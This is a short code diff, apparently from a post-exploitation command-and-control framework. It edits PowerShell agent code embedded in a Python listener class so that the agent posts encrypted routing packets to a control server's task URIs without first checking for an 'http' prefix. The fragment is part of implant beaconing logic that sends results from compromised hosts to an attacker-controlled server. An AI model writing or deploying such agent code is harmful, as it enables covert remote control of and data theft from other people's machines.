@@ -552,10 +552,7 @@ class Listener:
                             $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
                             #$RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
                             $RoutingPacketp = [System.BitConverter]::ToString($RoutingPacket)
-                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
-                                # build the web request object
-
-                                try {
+                            try {
                                     # get a random posting URI
                                     $taskURI = $Script:TaskURIs | Get-Random
                                     #$response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
@@ -569,7 +566,6 @@ class Listener:
                                 catch [System.Net.WebException]{
                                     # exception posting data...
                                 }
-                            }
                         }
                     }
                 """
